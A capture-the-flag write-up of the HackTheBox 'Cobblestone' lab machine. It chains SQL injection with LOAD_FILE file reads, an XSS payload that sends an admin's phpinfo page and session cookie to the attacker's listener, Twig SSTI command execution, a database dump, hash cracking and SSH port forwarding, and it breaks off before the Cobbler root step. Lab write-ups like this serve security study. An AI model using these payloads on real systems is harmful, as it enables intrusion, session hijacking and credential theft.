---
title: "Cobblestone"
date: 2026-08-15 00:00:00 +0500
categories: [HackTheBox, Linux]
tags: [SQLI, XSS, SSTI, Cobbler, CVE-2024-47533, Command-Injection]
description: Writeup for HackTheBox Cobblestone machine
image:
  path: assets/img/cobblestone/cobblestone.png
  alt: HTB Cobblestone
---

## 1. Executive Summary

Cobblestone is a Linux machine featuring a Minecraft-themed web application vulnerable to SQL Injection, Cross-Site Scripting (XSS), and Server-Side Template Injection (SSTI) Subdomain enumeration exposes a voting portal (`vote.cobblestone.htb`) vulnerable to a SQL injection attack via a URL parameter.

Exploiting the SQL injection using `LOAD_FILE()` reveals Apache virtual host configurations. The configurations indicate the presence of an internal Cobbler provisioning service and uncovers multiple subdomains. The main site's skin suggestion feature suffers from unauthenticated XSS, which is weaponized to steal the administrator's session cookie. Authenticated access to the administrative panel exposes an SSTI vulnerability in a Twig template within the user preview functionality, leading to Remote Code Execution (RCE). 

A reverse shell provides access to database credentials, allowing the extraction and cracking of the local `cobble` user's password. SSH access as `cobble` drops the attacker into a restricted shell environment. Port forwarding the local Cobbler service exposes its XML-RPC API, which suffers from an authentication bypass and command injection vulnerabilities, ultimately yielding a root shell.

---

## 2. Reconnaissance

### 2.1 Full TCP Port Scan

Initial reconnaissance starts with an Nmap scan to identify open ports and services running on the target. The scan combines service version detection and default scripts against discovered open ports. 

Execute the Nmap scan against the target IP address:

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ sudo nmap -sC -sV -Pn -p $(sudo nmap -Pn -p- --min-rate 10000 $ip | grep 'open' | cut -d '/' -f 1 | paste -sd ,) $ip -oN nmap.scan

Nmap scan report for 10.10.11.81
Host is up, received user-set (0.31s latency).
Scanned at 2026-01-11 09:20:47 PKT for 21s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 50:ef:5f:db:82:03:36:51:27:6c:6b:a6:fc:3f:5a:9f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBCfBUkQ4szy00s+EbTzIMq4Cv/mOkGWCD8xewIgvZ4zDI5pPhUaVYNsPaUmYzXgi0DzCy6s//8a1YFcyH398Nc=
|   256 e2:1d:f3:e9:6a:ce:fb:e0:13:9b:07:91:28:38:ec:5d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICuDtua7ciUfRA2uUH+ergsCOdq0Aaoakru1kQ9/OWPs
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.62
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://cobblestone.htb/
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The Nmap output shows an OpenSSH server on port 22 and an Apache HTTP server on port 80, which redirects traffic to the domain `cobblestone.htb`.

Add the primary domain `cobblestone.htb` to the local hosts file for proper DNS resolution:

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ echo "$ip  cobblestone.htb" | sudo tee -a /etc/hosts
```

### 2.2 Web Application Enumeration

Navigating to the web server over HTTP presents a Minecraft-themed homepage. 

<img src="assets/img/cobblestone/web_home.png" alt="error loading image">

The `Skin Database` links redirects to `/skins.php`, while `Get your own` and `Vote(beta)` redirects to subdomain `deploy.cobblestone.htb` and `vote.cobblestone.htb`. On the home there is another subdomain listed `mc.cobblestone.htb` which redirects back to `cobblestone.htb`.

Add the newly discovered subdomains to the local hosts file:

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ echo "$ip   vote.cobblestone.htb  deploy.cobblestone.htb" | sudo tee -a /etc/hosts
```

Clicking on `Skin Database` presents a login/register page, register an account and login with it.

<img src="assets/img/cobblestone/skin_registration.png" alt="error loading image">

On the home page there are already some skins, next to skins there is a download icon which downloads skins image files. I downloaded a skin and in burp history I tested the download endpoint because in some cases file download feature is vulnerable to LFI due to improper sanitization, but this endpoint is not vulnerable.

<img src="assets/img/cobblestone/file_down_lfi_test.png" alt="error loading image">

We can suggest a skin, let's test this endpoint for SSRF. Run a python websever `python3 -m http.server 8888`, and in skin url, enter your IP. I didn't receive a call back on the http server, but the message showed the suggestion will be reviewed by admin. In some cases, when an admin reviews the page, there is a potential of XSS which gets executed in the admin bot context.

<img src="assets/img/cobblestone/suggest_skin.png" alt="error loading image">

Let's visit subdomains, we may find additional accesses. The subdomain `deploy.cobblestone.htb` shows its under development.

<img src="assets/img/cobblestone/deploy_home.png" alt="error loading image">

Let's visit `vote.cobblestone.htb`, we are presented with a login page. Trying to login with credentials that we registered for `http://cobblestone.htb`, we got user not found. That means there is a chance that there are separate databases for `cobblestone.htb` and `vote.cobblestone.htb`.

<img src="assets/img/cobblestone/vote_login_fail.png" alt="error loading image">

Register a user, you can register the same user as above, and login with the registered credentials.

<img src="assets/img/cobblestone/vote_register.png" alt="error loading image">

On the dashboard, we can upvote the url. Clicking the upvote opens a popup `actual voting not implemented`.

<img src="assets/img/cobblestone/vote_popup.png" alt="error loading image">

There is reflected XSS, the popup is generated from source code, but it does not yield any result.

```js
<button class="btn btn-dark" onclick="javascript:alert('Actual upvoting not yet implemented')"><i class="fas fa-plus"></i> Upvote</button>
```

We can suggest a Minecraft server URL here. I suggested my IP and started a webserver to check for SSRF, but no request is made to me.

<img src="assets/img/cobblestone/vote_mc_server_url.png" alt="error loading image">

### 2.3 SQL Injection Discovery

I tested for SQL injection and the url parameter is vulnerable to SQL Injection. In the url parameter when I submitted `url=abcd` it redirected me to `/details.php?id=4` which means fourth suggestion and in response I got `Suggestion #4 - abcd` and `Approved: false`.

<img src="assets/img/cobblestone/url_param_req1.png" alt="error loadig image">

<img src="assets/img/cobblestone/url_param_req2.png" alt="error loading image">

On submitting payload `url=abcd' or '1'='1' -- -`, the search filter returns all the Minecraft server urls but I think the app code is selecting only the first url because in response we got `Suggestion #1 - mc.cobblestone.htb`.

<img src="assets/img/cobblestone/sqli_test_req1.png" alt="error loadig image">

<img src="assets/img/cobblestone/sqli_test_req2.png" alt="error loading image">

Remember the app is only printing the first row, so I used this payload to list database tables using `GROUP_CONCAT`.

```sql
url=-1' UNION SELECT 1,GROUP_CONCAT(table_schema,0x2e,table_name SEPARATOR 0x0a),3,4,5 FROM information_schema.tables WHERE table_schema NOT IN ('information_schema','performance_schema','mysql','sys')-- -
```

Url encode the payload, and send it we got two tables `vote.vote` and `vote.users`.

<img src="assets/img/cobblestone/sqli_list_table_req1.png" alt="error loading image">

<img src="assets/img/cobblestone/sqli_list_table_req2.png" alt="erorr loading image">

Let's get schema for `vote.users` table to get fields name. We got fields `Id`, `Username`, `FirstName`, `LastName`, `Email`, `Password`.

```sql
url=-1' UNION SELECT 1,GROUP_CONCAT(column_name SEPARATOR 0x2c),3,4,5 FROM information_schema.columns WHERE table_schema='vote' AND table_name='users'-- -
```

<img src="assets/img/cobblestone/sqli_get_schema_req1.png" alt="error loading image">

<img src="assets/img/cobblestone/sqli_get_schema_req2.png" alt="error loading image">

Then dump the username and password fields from the `users` table.

```sql
url=-1' UNION SELECT 1,GROUP_CONCAT(Username,0x3a,Password SEPARATOR 0x0a),3,4,5 FROM vote.users-- -
```

<img src="assets/img/cobblestone/sqli_dump_hashes_req1.png" alt="error loading image">

<img src="assets/img/cobblestone/sqli_dump_hashes_req2.png" alt="erorr loading image">

These hashes are not crackable, but found that we can read files on the system using `LOAD_FILE()`.

### 2.4 Arbitrary File Read

Test the `LOAD_FILE()` SQL function to read the local `/etc/passwd` file, confirming arbitrary file read capabilities as the database user:

```sql
url=-1' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5-- -
```

<img src="assets/img/cobblestone/sqli_passwd_req1.png" alt="error loading image">

<img src="assets/img/cobblestone/sqli_passwd_req2.png" alt="error loading image">

I am using cli ahead because its fast and easier. Let's read `/etc/apache2/sites-enabled/000-default.conf` to get the web directories.

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ curl -s -L -X POST -b "PHPSESSID=kol0fvrb65akt6plm2t1o7qg4p" --data-urlencode "url=-1' UNION SELECT 1,LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf'),3,4,5-- -" "http://vote.cobblestone.htb/suggest.php" | sed -n '/Owner-ID:/,/- Votes:/p' | sed -e '1s/.*Owner-ID: //' -e '$s/ - Votes:.*//'
<VirtualHost *:80>
        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^cobblestone.htb$
        RewriteRule /.* http://cobblestone.htb/ [R]
        ServerName 127.0.0.1
        ProxyPass "/cobbler_api" "http://127.0.0.1:25151/"
        ProxyPassReverse "/cobbler_api" "http://127.0.0.1:25151/"
</VirtualHost>

<VirtualHost *:80>
        ServerName cobblestone.htb

        ServerAdmin cobble@cobblestone.htb
        DocumentRoot /var/www/html

        <Directory /var/www/html>
                AAHatName cobblestone
        </Directory>

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^cobblestone.htb$
        RewriteRule /.* http://cobblestone.htb/ [R]

        Alias /cobbler /srv/www/cobbler

        <Directory /srv/www/cobbler>
                Options Indexes FollowSymLinks
                AllowOverride None
                Require all granted
        </Directory>

</VirtualHost>

<VirtualHost *:80>
        ServerName deploy.cobblestone.htb

        ServerAdmin cobble@cobblestone.htb
        DocumentRoot /var/www/deploy

        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^deploy.cobblestone.htb$
        RewriteRule /.* http://deploy.cobblestone.htb/ [R]
</VirtualHost>

<VirtualHost *:80>
        ServerName vote.cobblestone.htb

        ServerAdmin cobble@cobblestone.htb
        DocumentRoot /var/www/vote

        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^vote.cobblestone.htb$
        RewriteRule /.* http://vote.cobblestone.htb/ [R]
</VirtualHost>                                                        
```

Reading `/etc/apache2/sites-enabled/000-default.conf` via the SQLi/`LOAD_FILE()` primitive revealed three virtual hosts configured on the box: `cobblestone.htb` (`/var/www/html`), `deploy.cobblestone.htb` (`/var/www/deploy`), and `vote.cobblestone.htb` (`/var/www/vote`).

Two additional points of interest on the `cobblestone.htb` vhost:
The `ProxyPass "/cobbler_api" "http://127.0.0.1:25151/"` reverse-proxies `/cobbler_api` to an internal Cobbler provisioning service listening locally on port `25151`, not otherwise exposed externally. Cobbler is an open-source Linux provisioning server.
The `Alias /cobbler /srv/www/cobbler` with `Options Indexes FollowSymLinks` serves `/srv/www/cobbler` with directory listing enabled.

But the `http://cobblestone.htb/cobbler_api` is not accessible through my host because when I send the request it contains host `cobblestone.htb` which matches the second VirtualHost rule where the ServerName is `cobblestone.htb`. To access `/cobbler_api` the request with Host `127.0.0.1` must be sent. 

---

## 3. Initial Access via XSS and SSTI

### 3.1 Source Code Analysis

Let's read the `cobblestone.htb` app source code. Remember the `http://cobblestone.htb/skins.php`, which is presented when we login into `cobblestone.htb` that allows suggesting a skin, and at backend the POST request is sent to `http://cobblestone.htb/suggest_skin.php`. Let's first fetch these two files.

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ curl -s -L -X POST -b "PHPSESSID=hkkr2n1tggvkn3rgo14qve63d0" --data-urlencode "url=-1' UNION SELECT 1,LOAD_FILE('/var/www/html/skins.php'),3,4,5-- -" "http://vote.cobblestone.htb/suggest.php" | sed -n '/Owner-ID:/,/- Votes:/p' | sed -e '1s/.*Owner-ID: //' -e '$s/ - Votes:.*//' > skins.php 

┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ curl -s -L -X POST -b "PHPSESSID=hkkr2n1tggvkn3rgo14qve63d0" --data-urlencode "url=-1' UNION SELECT 1,LOAD_FILE('/var/www/html/suggest_skin.php'),3,4,5-- -" "http://vote.cobblestone.htb/suggest.php" | sed -n '/Owner-ID:/,/- Votes:/p' | sed -e '1s/.*Owner-ID: //' -e '$s/ - Votes:.*//' > suggest_skin.php
```

Both these files include `/var/www/htmldb/connection.php`. Let's first read the database connection file, maybe there are hardcoded credentials. We got the database credentials `cobblestone:CobbleTheStone123!`. Also note for `vote.cobblestone.htb`, the database was `vote` and this database is `cobblestone`.

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ curl -s -L -X POST -b "PHPSESSID=hkkr2n1tggvkn3rgo14qve63d0" --data-urlencode "url=-1' UNION SELECT 1,LOAD_FILE('/var/www/html/db/connection.php'),3,4,5-- -" "http://vote.cobblestone.htb/suggest.php" | sed -n '/Owner-ID:/,/- Votes:/p' | sed -e '1s/.*Owner-ID: //' -e '$s/ - Votes:.*//'                                                   
```

```php
<?php

$dbserver = "localhost";
$username = "dbuser";
$password = "aichooDeeYanaekungei9rogi0eMuo2o";
$dbname = "cobblestone";

$conn = new mysqli($dbserver, $username, $password, $dbname);

// Check connection
if ($conn->connect_errno > 0) {
    die("Connection failed: " . $conn->connect_error);
}
?>
```

Back to `skins.php` and `suggest_skin.php`, I found that the POST data (the skin suggested by user) is not sanitized and inserted directly into database, as can be seen in `suggest_skin.php` file line 16-37:

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = $_POST['username'];
    $name = $_POST['name'];
    $url = $_POST['url'];

    $stmt = $conn->prepare("INSERT INTO suggestions (username, name, url) VALUES (?, ?, ?)");
    $stmt->bind_param("sss", $user, $name, $url);

    if ($stmt->execute()) {
        $_SESSION['suggestion_message'] = "Suggestion has been added succesfully and will be reviewed by an admin.";
        $_SESSION['suggestion_message_type'] = "success";
        header("Location: skins.php");
        exit();
    } else {
        $_SESSION['suggestion_message'] = "Something went wrong submitting your suggestion.";
        $_SESSION['suggestion_message_type'] = "error";
        header("Location: skins.php");
        exit();
    }

    $stmt->close();
}
```

Twig template is used in webapp, and the twig templates directory is `/var/www/html/templates` as can referenced from `skins.php` line 16-18. The `\Twig\Loader\FilesystemLoader()` constructor defines the twig templates directory.

```php
# line 16-18 skins.php
// Init Twig
$loader = new \Twig\Loader\FilesystemLoader(__DIR__ . '/templates');
$twig = new \Twig\Environment($loader);
```

There are two Role based Access Control `admin` and `user`. When the role is `admin` it is rendering the `suggestion.html.twig` template passing the suggestions array `$suggestions`. This suggestion array is loaded from database at line 63 in `skins.php`.

```php
# line 177 skins.php
<?php if (isset($_SESSION['id']) && $_SESSION['role'] === 'admin') { echo $twig->render('suggest.html.twig',['suggestions' => $suggestions]); } ?>
```

Reading the `/var/www/html/templates/suggest.html.twig`, we found `username`, `name` and `url` field are passed as raw, meaning these fields are piped to `|raw`. The raw function doesn't escape the malicious html, therefore we have XSS.

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ curl -s -L -X POST -b "PHPSESSID=hkkr2n1tggvkn3rgo14qve63d0" --data-urlencode "url=-1' UNION SELECT 1,LOAD_FILE('/var/www/html/templates/suggest.html.twig'),3,4,5-- -" "http://vote.cobblestone.htb/suggest.php" | sed -n '/Owner-ID:/,/- Votes:/p' | sed -e '1s/.*Owner-ID: //' -e '$s/ - Votes:.*//' 

<h1 class="font-weigth-bold text-light mt-4 display-6">User Skin Suggestions</h1>

<table class="table table-dark table-striped table-light">
    <thead>
        <tr class="table-dark">
            <th scope="col">ID</th>
            <th scope="col">Username</th>
            <th scope="col">Skin Name</th>
            <th scope="col">Download-URL</th>
            <th scope="col"></th>
            <th scope="col"></th>
        </tr>
    </thead>
    {% for suggestion in suggestions %}
    <tr scope="row">
        <td class="text-light text-bold" id="{{ suggestion.id }}">
            {{ suggestion.id }}
        </td>
        <td class="text-light text-bold">
            {{ suggestion.username | raw}}
        </td>
        <td class="text-light text-bold">
            {{ suggestion.name | raw }}
        </td>
        <td class="suggestion-url text-light text-bold">
            {{ suggestion.url | raw }}
        </td>
        <td>
            <button class="btn btn-success" onclick="alert('Not yet implemented')">Approve</button>
        </td>
        <td>
            <button class="btn btn-danger" onclick="alert('Not yet implemented')">Decline</button>
        </td>
    </tr>

    {% else %}
        <p>No suggestions available</p>
    {% endfor %}
</table>
```

There is also a user management feature in admin panel, that is rendering `user.html.twig` template and passing it `$users` array which is loaded from database at line 38 in `skins.php`.

```php
# line 173 skins.php
<?php if (isset($_SESSION['id']) && $_SESSION['role'] === 'admin') { echo $twig->render('user.html.twig',['users' => $users]); } ?>
```

Reading the `/var/www/html/templates/user.html.twig`, it renders a form that allow admin to modify the user fields and send it `user.php` which updates the fields in database, but note the preview button. The preview button calls the `showPreview()` function which is also defined in `user.html.twig`. The `showPreview()` function takes user firstname and send a POST request to `/var/www/html/preview_banner.php` and what ever returned in response is shown in browser.

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ curl -s -L -X POST -b "PHPSESSID=hkkr2n1tggvkn3rgo14qve63d0" --data-urlencode "url=-1' UNION SELECT 1,LOAD_FILE('/var/www/html/templates/user.html.twig'),3,4,5-- -" "http://vote.cobblestone.htb/suggest.php" | sed -n '/Owner-ID:/,/- Votes:/p' | sed -e '1s/.*Owner-ID: //' -e '$s/ - Votes:.*//'
```

```html                                                 
<h1 class="font-weigth-bold text-light mt-4 display-6">User Management</h1>

<table class="table table-dark table-striped table-light">
    <thead>
        <tr class="table-dark">
            <th scope="col">ID</th>
            <th scope="col">Name</th>
            <th scope="col">First Name</th>
            <th scope="col">Last Name</th>
            <th scope="col">Email</th>
            <th scope="col">Role</th>
            <th scope="col"></th>
            <th scope="col"></th>
        </tr>
    </thead>
    {% for user in users %}
    <form id="form-{{ user.id }}" method="POST" action="user.php">
        <tr scope="row">
            <td class="text-light text-bold" id="{{ user.id }}">
                {{ user.id }}
                <input type="hidden" name="id" value="{{ user.id }}">
            </td>
            <td>
                <input type="text" class="form-control" name="name" value="{{ user.name }}">
            </td>
            <td>
                <input type="text" class="form-control" name="first" value="{{ user.first }}">
            </td>
            <td>
                <input type="text" class="form-control" name="last" value="{{ user.last }}">
            </td>
            <td>
                <input type="email" class="form-control" name="email" value="{{ user.email }}">
            </td>
            <td>
            <select class="form-select" name="role">
                <option value="user" {% if user.role == 'user' %}selected{% endif %}>User</option>
                <option value="admin" {% if user.role == 'admin' %}selected{% endif %}>Admin</option>
            </select>
            </td>
            <td>
                <button type="button" class="btn btn-info" onclick="showPreview('{{ user.id }}')">Preview</button>
            </td>
            <td>
                <button type="submit" class="btn btn-success">Save</button>
            </td>
        </tr>
    </form>
    {% else %}
        <p>No users available</p>
    {% endfor %}
</table>

<!-- Preview Modal -->
<div class="modal fade" id="userPreviewModal" tabindex="-1" aria-labelledby="previewModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg">
    <div class="modal-content bg-dark text-light">
      <div class="modal-header">
        <h5 class="modal-title" id="previewModalLabel">User Preview</h5>
        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
      </div>
      <div class="modal-body" id="previewModalBody">
        <!-- Dynamic content goes here -->
      </div>
    </div>
  </div>
</div>

<script>
async function showPreview(userId) {
    const form = document.getElementById('form-' + userId);
    const formData = new FormData(form);

    // Extract first name
    const firstName = formData.get('first');

    // Build preview content
    let content = '<dl class="row">';
    for (const [key, value] of formData.entries()) {
        content += `
            <dt class="col-sm-3 text-capitalize">${key}</dt>
            <dd class="col-sm-9">${value}</dd>
        `;
    }
    content += '</dl>';

    // Fetch rendered banner from PHP
    const bannerResponse = await fetch('preview_banner.php', {
        method: 'POST',
        body: new URLSearchParams({ first: firstName })
    });

    const bannerHtml = await bannerResponse.text();

    // Combine banner + content
    const finalHtml = `
        <p>The welcome banner would look like this:</p>
        ${bannerHtml}
        <hr />
        ${content}
    `;

    // Inject and show modal
    document.getElementById('previewModalBody').innerHTML = finalHtml;
    const modal = new bootstrap.Modal(document.getElementById('userPreviewModal'));
    modal.show();
}
</script>
```

The `preview_banner.php` takes the POST `first` parameter, render it through `header.html.twig` template and return the response.

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ curl -s -L -X POST -b "PHPSESSID=hkkr2n1tggvkn3rgo14qve63d0" --data-urlencode "url=-1' UNION SELECT 1,LOAD_FILE('/var/www/html/preview_banner.php'),3,4,5-- -" "http://vote.cobblestone.htb/suggest.php" | sed -n '/Owner-ID:/,/- Votes:/p' | sed -e '1s/.*Owner-ID: //' -e '$s/ - Votes:.*//'                                                        
<?php
session_start();

if (!isset($_SESSION['role']) || $_SESSION['role'] !== 'admin') {
    http_response_code(403); // Optional: send 403 Forbidden
    die('Access denied.');
}

include('vendor/autoload.php');

// Setup Twig
$loader = new \Twig\Loader\FilesystemLoader('templates');
$twig = new \Twig\Environment($loader);

// Get POST data
$first = $_POST['first'] ?? null;

// Render header
echo $twig->render('header.html.twig', ['first' => $twig->createTemplate($first)->render()]);

?>
```

Reading the `/var/www/html/templates/header.html.twig`, the `first` parameter is executed into template `{ first }`.

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ curl -s -L -X POST -b "PHPSESSID=hkkr2n1tggvkn3rgo14qve63d0" --data-urlencode "url=-1' UNION SELECT 1,LOAD_FILE('/var/www/html/templates/header.html.twig'),3,4,5-- -" "http://vote.cobblestone.htb/suggest.php" | sed -n '/Owner-ID:/p' | sed -e 's/.*Owner-ID: //' -e 's/ - Votes:.*//'                                                                     
<h1 class="text-light display-3">Welcome {{ first }}</h1>
```

Means in admin panel the first name field is vulnerable to SSTI, when the preview button is clicked.

### 3.2 XSS Exploitation and Cookie Theft

Let's first exploit the XSS to get admin cookie, but cookies are marked as `HttpOnly`, meaning cookies can't be exfiltrated through standard XSS document.cookie reading.

```
HTTP/1.1 302 Found
Date: Fri, 14 Aug 2026 14:19:00 GMT
Server: Apache/2.4.62 (Debian)
Set-Cookie: PHPSESSID=hkkr2n1tggvkn3rgo14qve63d0; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: login.php
Content-Length: 81
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<!-- Proudly coded by Billy (https://bybilly.uk) -->
<!-- Version: 1.9.2 -->
```

In `skins.php` I found twig template `footer.html.twig` which contain link to `skins_app_admin_server_info.php` file.

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ curl -s -L -X POST -b "PHPSESSID=hkkr2n1tggvkn3rgo14qve63d0" --data-urlencode "url=-1' UNION SELECT 1,LOAD_FILE('/var/www/html/templates/footer.html.twig'),3,4,5-- -" "http://vote.cobblestone.htb/suggest.php" | sed -n '/Owner-ID:/,/- Votes:/p' | sed -e '1s/.*Owner-ID: //' -e '$s/ - Votes:.*//' 
<footer class="mt-auto">
  <div class="container">
    <div class="row">
      <div class="col-md-12 mb-3">
        <p><a class="text-bold text-light" href="skins_app_admin_server_info.php" target="_blank">Admin server info</a></p>
      </div>
    </div>
  </div>
</footer>
```

Reading the source code of `skins_app_admin_server_info.php`, this script shows the current username, firstname, lastname, role of current user, also it is calling `phpinfo();` function. The `phpinfo();` returns detail information about php configuration and also returns the session cookies.

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ curl -s -L -X POST -b "PHPSESSID=hkkr2n1tggvkn3rgo14qve63d0" --data-urlencode "url=-1' UNION SELECT 1,LOAD_FILE('/var/www/html/skins_app_admin_server_info.php'),3,4,5-- -" "http://vote.cobblestone.htb/suggest.php" | sed -n '/Owner-ID:/,/- Votes:/p' | sed -e '1s/.*Owner-ID: //' -e '$s/ - Votes:.*//'
<?php 

session_start();

echo "USERNAME: " . $_SESSION["username"] . "<br>\r\n";
echo "FIRST NAME: " . $_SESSION["first"] . "<br>\r\n";
echo "LAST NAME: " . $_SESSION["last"] . "<br>\r\n";
echo "ROLE: " . $_SESSION["role"] . "<br>\r\n";

phpinfo(); 

?>
```

Through XSS, I will fetch `skins_app_admin_server_info.php` page and send it back to my listener. When admin bot views my skin the XSS will execute in admin context and we will get the admin cookie.

```shell
<script>fetch('/skins_app_admin_server_info.php').then(r=>r.text()).then(d=>{fetch('http://10.10.15.119:8000/',{method:'POST',body:d})})</script>
```

Submit the XSS payload in url parameter. Submitting the payload in name or username field is causing internal server error. First setup a listener:

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ nc -lvnp 8000 | grep 'PHPSESSID'
```

<img src="assets/img/cobblestone/url_xss.png" alt="error loading image">

We got the admin cookie.

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ nc -lvnp 8000 | grep 'PHPSESSID'
listening on [any] 8000 ...
connect to [10.10.15.119] from (UNKNOWN) [10.129.232.170] 57538
<tr><td class="e">HTTP_COOKIE </td><td class="v">PHPSESSID=cmblkgbpnkkd0sjc02ifcrm4vp </td></tr>
<tr><td class="e">Cookie </td><td class="v">PHPSESSID=cmblkgbpnkkd0sjc02ifcrm4vp </td></tr>
```

Set this cookie in browser cookies and refresh the page, we got the admin panel.

<img src="assets/img/cobblestone/admin_access.png" alt="error loading image">

### 3.3 SSTI to Remote Code Execution

Now the user first name is vulnerable to SSTI, let's confirms it with test payload `{7*7}`. In User Management tab, set payload `{7*7}` and click preview.

<img src="assets/img/cobblestone/ssti_test.png" alt="error loading image">

I captured the request in burp, the firstname field `first` was sent as POST parameter to `preview_banner.php`. First I tried to bypass the admin cookie exfiltration by sending the POST request to `preview_banner.php` directly through XSS in skin suggestion. From my normal user c0gnit00 session I sent below XSS payload:

```html
<script>fetch("/preview_banner.php",{method:"POST",body:"first="+encodeURIComponent("{% raw %}{{7*7}}{% endraw %}")}).then(r=>r.text()).then(t=>{fetch("http://10.10.15.119:8000/",{method:"POST",body:t})});</script>
```

I received a connect back on my listener but didn't get SSTI output.

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ nc -lvnp 8000
POST / HTTP/1.1                                                                                                                        
Host: 10.10.15.119:8000                                                                                                                
Connection: keep-alive
Content-Length: 0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Referer: http://cobblestone.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

```

Let's get back to the topic. Through SSTI I can execute system command `{ ['id'] | filter('system') }`.

<img src="assets/img/cobblestone/ssti_id_cmd.png" alt="error loading image">

Let's dump the cobblestone database users table, since we already have credentials, using the below command.

```js
{% raw %}{{ ['mysqldump -h localhost -u dbuser -paichooDeeYanaekungei9rogi0eMuo2o cobblestone users'] | filter('system') }}{% endraw %}
```

<img src="assets/img/cobblestone/dump_creds.png" alt="error loading image">

We got Admin and cobble user hash. Remember from `/etc/passwd` cobblestone is a valid system user on box. Remember from `/var/www/html/registration.php`, that these are SHA-256 hashes.

```
admin:f4166d263f25a862fa1b77116693253c24d18a36f5ac597d8a01b10a25c560d1
cobble20cdc5073e9e7a7631e9d35b5e1282a4fe6a8049e8a84c82987473321b0a8f4d
```

Using [CrackStation](https://crackstation.net/), the cobble user hash is cracked, we got password `	iluvdannymorethanyouknow`.

<img src="assets/img/cobblestone/crackstation_hash.png" alt="error loading image">

Login with cobble credentials, we got ssh shell.

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ sshpass -p 'iluvdannymorethanyouknow' ssh -o StrictHostKeyChecking=no cobble@cobblestone.htb 
Linux cobblestone 6.1.0-47-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.170-3 (2026-05-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
cobble@cobblestone:~$ id
-rbash: id: command not found
cobble@cobblestone:~$ cat user.txt                                                                                                    
*******************d48e1d4dbedaf3221b
```

### 3.4 Restricted Shell And Port Forwarding

But we are in a restricted bash, but we can run `ss` and `ps` commands. Remember from apache site-enabled conf that cobble service api is running on `http://127.0.0.1:25151`, and through process and listening port cobbler service is running.

```shell
cobble@cobblestone:~$ ps aux | grep cobbler                                                                                           
root         976  0.0  1.7 145088 68836 ?        Ss   13:54   0:04 /usr/bin/python3 /usr/local/bin/cobblerd -F
cobble     89322  0.0  0.0   3324  1584 ?        S+   19:35   0:00 grep cobbler

cobble@cobblestone:~$ ss -tunlp                                                                                                       
Netid        State         Recv-Q        Send-Q               Local Address:Port                Peer Address:Port       Process        
udp          UNCONN        0             0                          0.0.0.0:68                       0.0.0.0:*                         
udp          UNCONN        0             0                          0.0.0.0:69                       0.0.0.0:*                         
udp          UNCONN        0             0                             [::]:69                          [::]:*                         
tcp          LISTEN        0             511                        0.0.0.0:80                       0.0.0.0:*                         
tcp          LISTEN        0             128                        0.0.0.0:22                       0.0.0.0:*                         
tcp          LISTEN        0             80                       127.0.0.1:3306                     0.0.0.0:*                         
tcp          LISTEN        0             5                        127.0.0.1:25151                    0.0.0.0:*                         
tcp          LISTEN        0             128                           [::]:22                          [::]:*                         
```

Forward local port 25151 to attack box.

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
└─$ sshpass -p 'iluvdannymorethanyouknow' ssh -N -L 25151:127.0.0.1:25151 cobble@cobblestone.htb
```

Checking for cobbler version, we got `3.3.6` and built on `Mon Sep 30 10:40:50 2024`.

```shell
┌──(kali㉿kali)-[~/HTB/Machines/Cobblestone]
